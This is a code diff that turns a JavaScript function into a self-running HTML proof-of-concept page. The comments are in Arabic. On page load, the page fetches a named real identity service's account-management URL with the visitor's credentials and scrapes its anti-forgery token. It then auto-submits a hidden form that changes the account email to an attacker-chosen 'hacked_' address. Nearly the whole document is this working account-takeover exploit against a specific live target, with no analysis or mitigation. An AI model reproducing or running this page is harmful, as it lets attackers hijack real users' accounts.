@@ -1,63 +1,78 @@
-async function executePackageDoom() {
-    try {
-        // 1. سحب التوكن والبيانات (CORS)
-        const response = await fetch(target, { method: 'GET', credentials: 'include' });
-        const html = await response.text();
-        const parser = new DOMParser();
-        const doc = parser.parseFromString(html, 'text/html');
-        
-        const token = doc.querySelector('input[name="__RequestVerificationToken"]')?.value;
-        
-        if (!token) {
-            document.getElementById('msg').innerText = "❌ Failed: CSRF Token not found (Are you logged in?)";
-            return;
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC Executing...</title>
+</head>
+<body>
+    <div id="msg">Initializing...</div>
+
+    <script>
+        // 1. تعريف المتغيرات الأساسية أولاً
+        const target = "https://identity.facilitymanagement.iot.vodafone.gr/identity/Manage";
+
+        // 2. الدالة (نفس الكود اللي معك بس تأكد إنه داخل سكريبت)
+        async function executePackageDoom() {
+            try {
+                document.getElementById('msg').innerText = "Step 1: Fetching Token...";
+                
+                const response = await fetch(target, { method: 'GET', credentials: 'include' });
+                const html = await response.text();
+                const parser = new DOMParser();
+                const doc = parser.parseFromString(html, 'text/html');
+                
+                const token = doc.querySelector('input[name="__RequestVerificationToken"]')?.value;
+                
+                if (!token) {
+                    document.getElementById('msg').innerText = "❌ Failed: Token not found. Are you logged in?";
+                    return;
+                }
+
+                document.getElementById('msg').innerText = `Step 2: Token Captured! Redirecting to Change Email...`;
+
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = target;
+
+                const randomPrefix = Math.random().toString(36).substring(2, 10);
+                const newEmail = `hacked_${randomPrefix}@checkmate-poc.io`;
+
+                const data = {
+                    'IsEmailConfirmed': 'True',
+                    'Email': newEmail,
+                    'PhoneNumber': '',
+                    'Name': '',
+                    'Website': '',
+                    'Profile': '',
+                    'StreetAddress': '',
+                    'Locality': '12',
+                    'Region': '',
+                    'PostalCode': '',
+                    'Country': '',
+                    '__RequestVerificationToken': token
+                };
+
+                for (const key in data) {
+                    const input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = key;
+                    input.value = data[key];
+                    form.appendChild(input);
+                }
+
+                document.body.appendChild(form);
+                
+                setTimeout(() => {
+                    form.submit(); 
+                }, 1000);
+
+            } catch (err) {
+                document.getElementById('msg').innerText = "❌ Error: " + err.message;
+            }
         }
 
-        document.getElementById('msg').innerText = `Step 2: Token Captured! Executing Account Takeover...`;
+        // 3. الخطوة الأهم: استدعاء الدالة عشان "تشتغل" تلقائياً
+        window.onload = executePackageDoom;
 
-    
-        // السيرفر هون بتوقع Form Submission حقيقي (Content-Type: application/x-www-form-urlencoded)
-        
-        const form = document.createElement('form');
-        form.method = 'POST';
-        form.action = target;
-
-
-        const randomPrefix = Math.random().toString(36).substring(2, 10);
-        const newEmail = `hacked_${randomPrefix}@checkmate-poc.io`;
-
-       
-        const data = {
-            'IsEmailConfirmed': 'True',
-            'Email': newEmail,
-            'PhoneNumber': '',
-            'Name': '',
-            'Website': '',
-            'Profile': '',
-            'StreetAddress': '',
-            'Locality': '12', // القيمة اللي كانت بالـ Request تبعك
-            'Region': '',
-            'PostalCode': '',
-            'Country': '',
-            '__RequestVerificationToken': token
-        };
-
-        for (const key in data) {
-            const input = document.createElement('input');
-            input.type = 'hidden';
-            input.name = key;
-            input.value = data[key];
-            form.appendChild(input);
-        }
-
-        document.body.appendChild(form);
-        
-
-setTimeout(() => {
-            form.submit(); 
-        }, 1000);
-
-    } catch (err) {
-        document.getElementById('msg').innerText = "❌ Error: " + err.message;
-    }
-}
+    </script>
+</body>
+</html>
